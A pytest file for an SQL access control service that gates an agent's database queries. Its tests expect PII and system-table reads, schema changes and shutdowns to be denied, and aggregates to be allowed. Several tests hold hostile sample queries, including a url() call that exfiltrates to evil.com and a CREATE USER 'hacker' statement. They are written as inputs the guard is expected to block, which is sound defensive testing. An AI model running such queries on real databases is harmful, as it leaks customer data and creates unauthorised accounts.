"""Tests for the Access Control Service."""

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from access_control import AccessControlService, Decision, QueryType


def make_service():
    return AccessControlService()


class TestQueryClassification:
    def test_select_row(self):
        ac = make_service()
        qt = ac.analyzer.classify_query("SELECT email FROM sao.customers LIMIT 10")
        assert qt == QueryType.SELECT_ROW

    def test_aggregate(self):
        ac = make_service()
        qt = ac.analyzer.classify_query(
            "SELECT city, AVG(credit_score) FROM sao.customers GROUP BY city"
        )
        assert qt == QueryType.AGGREGATE

    def test_count_is_aggregate(self):
        ac = make_service()
        qt = ac.analyzer.classify_query("SELECT COUNT(*) FROM sao.customers")
        assert qt == QueryType.AGGREGATE

    def test_ddl(self):
        ac = make_service()
        qt = ac.analyzer.classify_query("DROP TABLE sao.customers")
        assert qt == QueryType.DDL

    def test_dml(self):
        ac = make_service()
        qt = ac.analyzer.classify_query("INSERT INTO sao.customers VALUES (1, 'a')")
        assert qt == QueryType.DML

    def test_system_cmd(self):
        ac = make_service()
        qt = ac.analyzer.classify_query("SYSTEM SHUTDOWN")
        assert qt == QueryType.SYSTEM_CMD


class TestAccessControl:
    def test_deny_pii_row_access(self):
        ac = make_service()
        result = ac.check("agent", "SELECT email, full_name FROM sao.customers LIMIT 10")
        assert result.decision == Decision.DENY
        assert "PII" in result.reason or "sensitive" in result.reason.lower()

    def test_allow_safe_table(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT category, SUM(total_amount) FROM sao.revenue_daily GROUP BY category",
        )
        assert result.decision == Decision.ALLOW

    def test_deny_system_table(self):
        ac = make_service()
        result = ac.check("agent", "SELECT * FROM system.columns")
        assert result.decision == Decision.DENY

    def test_deny_ddl(self):
        ac = make_service()
        result = ac.check("agent", "DROP TABLE sao.customers")
        assert result.decision == Decision.DENY

    def test_deny_dml(self):
        ac = make_service()
        result = ac.check("agent", "INSERT INTO sao.customers VALUES (1, 'test')")
        assert result.decision == Decision.DENY

    def test_allow_aggregation_over_financial(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT city, AVG(credit_score) FROM sao.customers GROUP BY city",
        )
        assert result.decision == Decision.ALLOW

    def test_deny_row_level_financial(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT customer_id, credit_score FROM sao.customers LIMIT 100",
        )
        assert result.decision == Decision.DENY

    def test_deny_dangerous_functions(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT * FROM url('http://evil.com/exfil', CSV, 'a String')",
        )
        assert result.decision == Decision.DENY

    def test_deny_card_last4(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT card_last4, ip_address FROM sao.transactions LIMIT 10",
        )
        assert result.decision == Decision.DENY

    def test_admin_unrestricted(self):
        ac = make_service()
        result = ac.check(
            "agent_unrestricted",
            "SELECT email FROM sao.customers LIMIT 10",
        )
        assert result.decision == Decision.ALLOW

    def test_deny_system_shutdown(self):
        ac = make_service()
        result = ac.check("agent", "SYSTEM SHUTDOWN")
        assert result.decision == Decision.DENY

    def test_deny_query_log_snooping(self):
        ac = make_service()
        result = ac.check("agent", "SELECT query FROM system.query_log LIMIT 10")
        assert result.decision == Decision.DENY

    def test_deny_process_list(self):
        ac = make_service()
        result = ac.check("agent", "SELECT * FROM system.processes")
        assert result.decision == Decision.DENY

    def test_deny_create_user(self):
        ac = make_service()
        result = ac.check("agent", "CREATE USER hacker IDENTIFIED BY 'password'")
        assert result.decision == Decision.DENY

    def test_deny_fraud_score_row(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT customer_id, fraud_score FROM sao.transactions WHERE fraud_score > 0.9",
        )
        assert result.decision == Decision.DENY

    def test_allow_safe_product_query(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT name, category, price_cents FROM sao.products WHERE is_active = 1",
        )
        assert result.decision == Decision.ALLOW


if __name__ == "__main__":
    import pytest
    pytest.main([__file__, "-v"])
